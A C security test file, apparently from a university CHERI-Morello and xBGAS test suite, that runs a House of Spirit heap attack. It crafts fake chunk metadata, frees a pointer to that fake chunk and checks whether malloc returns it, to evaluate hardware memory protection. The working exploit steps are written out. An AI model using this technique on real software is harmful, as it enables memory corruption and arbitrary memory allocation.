/**
 * @file ttu_t3_hm_house_of_spirit_refactored.c
 * @brief Refactored Heap Manipulation - House of Spirit Security Test
 * @author Mert Side (Texas Tech University)
 * @date 2024
 * 
 * @section DESCRIPTION
 * This program demonstrates the "House of Spirit" heap manipulation vulnerability.
 * The vulnerability occurs when:
 * 1. A fake chunk is crafted in stack/data memory with proper size metadata
 * 2. A legitimate heap pointer is overwritten to point to the fake chunk
 * 3. The fake chunk is freed, placing it into the fastbin/tcache
 * 4. Subsequent malloc() calls may return the fake chunk, enabling arbitrary allocation
 * 
 * @section CHERI_ANALYSIS
 * On CHERI-Morello systems, this test evaluates:
 * - Prevention of pointer substitution via capability bounds checking
 * - Detection of invalid free() operations on non-heap memory
 * - Protection against fake chunk injection into heap metadata
 * - Capability validation for heap operations
 * 
 * @section EXPECTED_BEHAVIOR
 * - Traditional systems: May accept fake chunk and allocate arbitrary memory
 * - CHERI-Morello: Should trap on capability violations, preventing fake chunk exploitation
 * 
 * @section TEST_PHASES
 * 1. SETUP: Initialize xBGAS runtime and thread environment
 * 2. ALLOCATE_HEAP: Create legitimate heap allocation
 * 3. CRAFT_FAKE: Create fake chunk with proper metadata
 * 4. ANALYZE_LAYOUT: Examine memory layout and capabilities
 * 5. SUBSTITUTE_POINTER: Replace heap pointer with fake chunk address
 * 6. FREE_FAKE: Attempt to free fake chunk (vulnerability)
 * 7. ALLOCATE_VICTIM: Try to allocate from fake chunk
 * 8. VERIFY_EXPLOIT: Check if arbitrary allocation succeeded
 * 9. CLEANUP: Free remaining allocations
 * 10. TEARDOWN: Close xBGAS runtime
 * 
 * @section REFERENCES
 * - House of Spirit attack: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>

// Include new modular headers
#include "../../runtime/xbrtime_common.h"
#include "../../runtime/xbrtime_api.h"
#include "../../runtime/test.h"

//=============================================================================
// TEST CONFIGURATION AND CONSTANTS
//=============================================================================

/** @brief Test identification */
#define TEST_NAME "Heap Manipulation - House of Spirit"
#define TEST_ID "TTU_T3"
#define TEST_CATEGORY "HEAP_MANIPULATION"

/** @brief Heap allocation constants */
#define CHUNK_SIZE 0x30
#define FAKE_CHUNK_SIZE 0x40
#define METADATA_SIZE sizeof(size_t)

/** @brief Test phases for structured execution */
typedef enum {
    PHASE_SETUP = 0,
    PHASE_ALLOCATE_HEAP,
    PHASE_CRAFT_FAKE,
    PHASE_ANALYZE_LAYOUT,
    PHASE_SUBSTITUTE_POINTER,
    PHASE_FREE_FAKE,
    PHASE_ALLOCATE_VICTIM,
    PHASE_VERIFY_EXPLOIT,
    PHASE_CLEANUP,
    PHASE_TEARDOWN,
    PHASE_MAX
} test_phase_t;

//=============================================================================
// DATA STRUCTURES
//=============================================================================

/** @brief Fake chunk structure mimicking heap chunk layout */
typedef struct {
    size_t prev_size;           /**< Previous chunk size (unused in this attack) */
    size_t size;                /**< Current chunk size (critical for fastbin) */
    struct fake_chunk_t *fd;    /**< Forward pointer (unused in single chunk) */
    struct fake_chunk_t *bk;    /**< Backward pointer (unused in single chunk) */
    char user_data[0x20];       /**< User data area */
} fake_chunk_t;

//=============================================================================
// GLOBAL STATE AND SIGNAL HANDLING
//=============================================================================

/** @brief Global test state for signal handling */
static struct {
    jmp_buf recovery_point;
    volatile sig_atomic_t signal_caught;
    volatile sig_atomic_t current_phase;
    volatile sig_atomic_t thread_id;
    void* original_heap_ptr;
    void* substituted_ptr;
    void* victim_ptr;
    fake_chunk_t fake_chunks[2];
    int exploit_succeeded;
    uintptr_t original_address;
    uintptr_t fake_address;
} test_state = {0};

/** @brief Signal handler for memory safety violations */
static void signal_handler(int sig) {
    test_state.signal_caught = sig;
    
    const char* signal_name = (sig == SIGSEGV) ? "SIGSEGV" :
                              (sig == SIGBUS) ? "SIGBUS" :
                              (sig == SIGABRT) ? "SIGABRT" : "UNKNOWN";
    
    printf("[Thread %ld] 🛡️  CHERI Protection: Caught %s during phase %d\n", 
           (long)test_state.thread_id, signal_name, (int)test_state.current_phase);
    
    // Jump back to recovery point
    longjmp(test_state.recovery_point, sig);
}

/** @brief Setup signal handlers for the test */
static void setup_signal_handlers(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
}

//=============================================================================
// MEMORY ANALYSIS UTILITIES
//=============================================================================

/** @brief Analyze pointer properties (CHERI-specific) */
static void analyze_pointer(const char* name, void* ptr) {
    if (!ptr) {
        printf("[Thread %ld] 🔍 %s: NULL pointer\n", 
               (long)test_state.thread_id, name);
        return;
    }
    
    printf("[Thread %ld] 🔍 %s: %p", 
           (long)test_state.thread_id, name, ptr);
    
#ifdef __CHERI__
    // CHERI-specific capability analysis
    printf(" [tag=%d, base=%#lx, length=%#lx, offset=%#lx]",
           __builtin_cheri_tag_get(ptr),
           __builtin_cheri_base_get(ptr),
           __builtin_cheri_length_get(ptr),
           __builtin_cheri_offset_get(ptr));
#endif
    
    printf("\n");
}

/** @brief Display memory layout for heap vs stack/data */
static void display_memory_layout(const char* phase) {
    printf("[Thread %ld] 🗺️  Memory layout analysis (%s):\n", 
           (long)test_state.thread_id, phase);
    
    // Analyze heap pointer
    if (test_state.original_heap_ptr) {
        analyze_pointer("Original heap pointer", test_state.original_heap_ptr);
        printf("[Thread %ld]   ↳ Address: %#lx (heap region)\n", 
               (long)test_state.thread_id, (uintptr_t)test_state.original_heap_ptr);
    }
    
    // Analyze fake chunk
    printf("[Thread %ld] 🔍 Fake chunk location: %p\n", 
           (long)test_state.thread_id, (void*)&test_state.fake_chunks[0]);
    printf("[Thread %ld]   ↳ Address: %#lx (stack/data region)\n", 
           (long)test_state.thread_id, (uintptr_t)&test_state.fake_chunks[0]);
    
    // Calculate address difference
    if (test_state.original_heap_ptr) {
        uintptr_t heap_addr = (uintptr_t)test_state.original_heap_ptr;
        uintptr_t fake_addr = (uintptr_t)&test_state.fake_chunks[0];
        
        printf("[Thread %ld] 📏 Address difference: %#lx (%s)\n", 
               (long)test_state.thread_id,
               heap_addr > fake_addr ? heap_addr - fake_addr : fake_addr - heap_addr,
               heap_addr > fake_addr ? "heap higher" : "fake higher");
    }
}

/** @brief Analyze fake chunk metadata */
static void analyze_fake_chunk_metadata(void) {
    printf("[Thread %ld] 🔬 Fake chunk metadata analysis:\n", 
           (long)test_state.thread_id);
    
    printf("[Thread %ld]   prev_size: %#lx\n", 
           (long)test_state.thread_id, test_state.fake_chunks[0].prev_size);
    printf("[Thread %ld]   size: %#lx\n", 
           (long)test_state.thread_id, test_state.fake_chunks[0].size);
    printf("[Thread %ld]   fd: %p\n", 
           (long)test_state.thread_id, (void*)test_state.fake_chunks[0].fd);
    printf("[Thread %ld]   bk: %p\n", 
           (long)test_state.thread_id, (void*)test_state.fake_chunks[0].bk);
    
    // Check if metadata appears valid for heap allocator
    if (test_state.fake_chunks[0].size >= 0x20 && test_state.fake_chunks[0].size <= 0x80) {
        printf("[Thread %ld] ✅ Fake chunk size appears valid for fastbin\n", 
               (long)test_state.thread_id);
    } else {
        printf("[Thread %ld] ❌ Fake chunk size invalid for fastbin\n", 
               (long)test_state.thread_id);
    }
}

//=============================================================================
// FAKE CHUNK CREATION UTILITIES
//=============================================================================

/** @brief Craft fake chunk with proper metadata */
static void craft_fake_chunk(void) {
    printf("[Thread %ld] 🔨 Crafting fake chunk with heap-like metadata\n", 
           (long)test_state.thread_id);
    
    // Initialize fake chunks (need two for size validation)
    memset(&test_state.fake_chunks, 0, sizeof(test_state.fake_chunks));
    
    // Set up first fake chunk
    test_state.fake_chunks[0].prev_size = 0;
    test_state.fake_chunks[0].size = FAKE_CHUNK_SIZE;  // Must match fastbin size
    test_state.fake_chunks[0].fd = NULL;
    test_state.fake_chunks[0].bk = NULL;
    
    // Set up second fake chunk (for size validation)
    test_state.fake_chunks[1].prev_size = FAKE_CHUNK_SIZE;
    test_state.fake_chunks[1].size = FAKE_CHUNK_SIZE;
    
    // Fill user data with recognizable pattern
    memset(test_state.fake_chunks[0].user_data, 0xAA, sizeof(test_state.fake_chunks[0].user_data));
    
    printf("[Thread %ld] ✅ Fake chunk crafted successfully\n", 
           (long)test_state.thread_id);
}

//=============================================================================
// CORE TEST LOGIC
//=============================================================================

/** @brief Execute the House of Spirit heap manipulation test */
static void* execute_house_of_spirit_test(void* arg) {
    long tid = (long)arg;
    test_state.thread_id = tid;
    int recovery_signal = 0;
    
    printf("\n[Thread %ld] 🚀 Starting %s test\n", tid, TEST_NAME);
    printf("[Thread %ld] 📝 Test ID: %s, Category: %s\n", tid, TEST_ID, TEST_CATEGORY);
    
    // Setup signal handling
    setup_signal_handlers();
    
    // Set recovery point for signal handling
    if ((recovery_signal = setjmp(test_state.recovery_point)) != 0) {
        printf("[Thread %ld] 🔄 Recovered from signal %d in phase %d\n", 
               tid, recovery_signal, (int)test_state.current_phase);
        goto cleanup_and_exit;
    }
    
    // PHASE 1: SETUP
    test_state.current_phase = PHASE_SETUP;
    printf("[Thread %ld] 📋 Phase %d: Setup\n", tid, PHASE_SETUP);
    test_state.exploit_succeeded = 0;
    
    // PHASE 2: ALLOCATE_HEAP
    test_state.current_phase = PHASE_ALLOCATE_HEAP;
    printf("[Thread %ld] 📋 Phase %d: Allocate legitimate heap memory\n", tid, PHASE_ALLOCATE_HEAP);
    
    test_state.original_heap_ptr = malloc(CHUNK_SIZE);
    if (!test_state.original_heap_ptr) {
        printf("[Thread %ld] ❌ Failed to allocate heap memory\n", tid);
        return NULL;
    }
    
    test_state.original_address = (uintptr_t)test_state.original_heap_ptr;
    
    // Initialize heap memory with pattern
    memset(test_state.original_heap_ptr, 0x42, CHUNK_SIZE);
    
    analyze_pointer("Original heap allocation", test_state.original_heap_ptr);
    
    // PHASE 3: CRAFT_FAKE
    test_state.current_phase = PHASE_CRAFT_FAKE;
    printf("[Thread %ld] 📋 Phase %d: Craft fake chunk\n", tid, PHASE_CRAFT_FAKE);
    
    craft_fake_chunk();
    test_state.fake_address = (uintptr_t)&test_state.fake_chunks[0].fd;
    
    analyze_fake_chunk_metadata();
    
    // PHASE 4: ANALYZE_LAYOUT
    test_state.current_phase = PHASE_ANALYZE_LAYOUT;
    printf("[Thread %ld] 📋 Phase %d: Analyze memory layout\n", tid, PHASE_ANALYZE_LAYOUT);
    
    display_memory_layout("before substitution");
    
    // PHASE 5: SUBSTITUTE_POINTER (Critical vulnerability phase)
    test_state.current_phase = PHASE_SUBSTITUTE_POINTER;
    printf("[Thread %ld] 📋 Phase %d: Substitute pointer to fake chunk\n", tid, PHASE_SUBSTITUTE_POINTER);
    printf("[Thread %ld] 🚨 CRITICAL: Replacing heap pointer with fake chunk address\n", tid);
    
    // This is the attack - replace heap pointer with fake chunk address
    // Point to the fd field of fake chunk (where user data would be)
    test_state.substituted_ptr = (void*)&test_state.fake_chunks[0].fd;
    
    analyze_pointer("Substituted pointer", test_state.substituted_ptr);
    
    display_memory_layout("after substitution");
    
    // PHASE 6: FREE_FAKE (Critical vulnerability test)
    test_state.current_phase = PHASE_FREE_FAKE;
    printf("[Thread %ld] 📋 Phase %d: Attempt to free fake chunk\n", tid, PHASE_FREE_FAKE);
    printf("[Thread %ld] 🚨 CRITICAL: Attempting to free non-heap memory\n", tid);
    
    // This is the vulnerability - freeing fake chunk
    printf("[Thread %ld] 💥 Calling free() on fake chunk...\n", tid);
    free(test_state.substituted_ptr);
    
    printf("[Thread %ld] 🚨 VULNERABILITY: Fake chunk free succeeded!\n", tid);
    
    // PHASE 7: ALLOCATE_VICTIM
    test_state.current_phase = PHASE_ALLOCATE_VICTIM;
    printf("[Thread %ld] 📋 Phase %d: Attempt to allocate victim from fake chunk\n", tid, PHASE_ALLOCATE_VICTIM);
    
    // Allocate memory that should come from fake chunk if exploit worked
    test_state.victim_ptr = malloc(CHUNK_SIZE);
    
    analyze_pointer("Victim allocation", test_state.victim_ptr);
    
    // PHASE 8: VERIFY_EXPLOIT
    test_state.current_phase = PHASE_VERIFY_EXPLOIT;
    printf("[Thread %ld] 📋 Phase %d: Verify exploit success\n", tid, PHASE_VERIFY_EXPLOIT);
    
    if (test_state.victim_ptr == test_state.substituted_ptr) {
        printf("[Thread %ld] 🚨 EXPLOIT SUCCESS: Fake chunk allocated as victim!\n", tid);
        printf("[Thread %ld] 💥 Arbitrary memory allocation successful\n", tid);
        test_state.exploit_succeeded = 1;
        
        // Verify we can write to the fake chunk
        if (test_state.victim_ptr) {
            memset(test_state.victim_ptr, 0xFF, CHUNK_SIZE);
            printf("[Thread %ld] ✏️  Successfully wrote to fake chunk\n", tid);
        }
    } else {
        printf("[Thread %ld] ✅ EXPLOIT FAILED: Victim not allocated from fake chunk\n", tid);
        printf("[Thread %ld] 🔒 Heap integrity preserved\n", tid);
        
        if (test_state.victim_ptr != test_state.original_heap_ptr) {
            printf("[Thread %ld] ℹ️  Victim allocated from different location\n", tid);
        }
    }
    
cleanup_and_exit:
    // PHASE 9: CLEANUP
    test_state.current_phase = PHASE_CLEANUP;
    printf("[Thread %ld] 📋 Phase %d: Cleanup\n", tid, PHASE_CLEANUP);
    
    // Free valid allocations (be careful with fake chunks)
    if (test_state.original_heap_ptr && !test_state.exploit_succeeded) {
        free(test_state.original_heap_ptr);
    }
    
    if (test_state.victim_ptr && test_state.victim_ptr != test_state.substituted_ptr) {
        free(test_state.victim_ptr);
    }
    
    // PHASE 10: TEARDOWN
    test_state.current_phase = PHASE_TEARDOWN;
    printf("[Thread %ld] 📋 Phase %d: Teardown\n", tid, PHASE_TEARDOWN);
    
    if (recovery_signal != 0) {
        printf("[Thread %ld] ✅ Test completed with CHERI protection (signal %d)\n", tid, recovery_signal);
        printf("[Thread %ld] 🔒 House of Spirit attack prevented\n", tid);
    } else {
        printf("[Thread %ld] ❌ Test completed without protection\n", tid);
        if (test_state.exploit_succeeded) {
            printf("[Thread %ld] 💥 House of Spirit vulnerability exploitable\n", tid);
        } else {
            printf("[Thread %ld] ℹ️  Exploit failed (may be due to allocator implementation)\n", tid);
        }
    }
    
    printf("[Thread %ld] 🏁 %s test finished\n\n", tid, TEST_NAME);
    return NULL;
}

//=============================================================================
// MAIN FUNCTION AND TEST ORCHESTRATION
//=============================================================================

/**
 * @brief Main function - orchestrates the multi-threaded House of Spirit test
 * @return 0 on success, non-zero on failure
 */
int main(void) {
    printf("=================================================================\n");
    printf("🔬 xBGAS Security Test: %s\n", TEST_NAME);
    printf("📊 Test ID: %s | Category: %s\n", TEST_ID, TEST_CATEGORY);
    printf("🎯 Platform: CHERI-Morello | Runtime: xBGAS\n");
    printf("=================================================================\n\n");
    
    // Initialize xBGAS runtime
    printf("🚀 Initializing xBGAS runtime...\n");
    xbrtime_init();
    
    int num_pes = xbrtime_num_pes();
    printf("📊 Number of processing elements: %d\n", num_pes);
    printf("🧵 Starting multi-threaded House of Spirit test...\n\n");
    
    // Execute test on all available processing elements
    for (long i = 0; i < num_pes; i++) {
        tpool_add_work(threads[i].thread_queue, execute_house_of_spirit_test, (void*)i);
    }
    
    // Wait for all threads to complete
    printf("⏳ Waiting for all threads to complete...\n");
    for (int i = 0; i < num_pes; i++) {
        tpool_wait(threads[i].thread_queue);
    }
    
    printf("=================================================================\n");
    printf("✅ Multi-threaded %s test completed\n", TEST_NAME);
    printf("📈 All %d processing elements finished execution\n", num_pes);
    printf("🔒 CHERI-Morello House of Spirit protection evaluation complete\n");
    printf("=================================================================\n");
    
    // Close xBGAS runtime
    xbrtime_close();
    
    return 0;
}

/**
 * @brief Test Summary
 * 
 * This refactored test provides comprehensive evaluation of:
 * 
 * 1. **Fake Chunk Prevention**: Tests prevention of fake chunk injection
 * 2. **Pointer Substitution Detection**: Validates capability bounds checking
 * 3. **Free Operation Validation**: Tests heap vs non-heap memory detection
 * 4. **CHERI Capability System**: Tests capability validation for heap operations
 * 5. **Multi-threading**: Concurrent House of Spirit testing
 * 6. **Memory Layout Analysis**: Detailed heap vs stack/data comparison
 * 7. **Phase-based Execution**: Structured attack progression
 * 8. **Comprehensive Logging**: Detailed attack state tracking
 * 
 * Expected behavior on CHERI-Morello:
 * - Heap pointers should have bounded capabilities
 * - Attempt to free non-heap memory should trap
 * - Fake chunk injection should be prevented
 * - Heap integrity should be preserved
 * 
 * On traditional systems:
 * - Fake chunk may be accepted by allocator
 * - Arbitrary memory allocation may succeed
 * - House of Spirit attack would be exploitable
 */
